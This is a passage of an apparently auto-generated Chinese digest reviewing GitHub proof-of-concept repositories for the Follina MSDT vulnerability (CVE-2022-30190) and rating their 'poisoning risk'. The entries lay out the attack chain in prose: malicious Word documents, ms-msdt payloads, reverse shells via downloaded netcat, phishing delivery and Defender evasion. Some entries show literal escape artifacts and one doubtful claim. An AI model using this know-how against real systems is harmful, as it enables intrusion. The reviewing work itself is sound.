*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
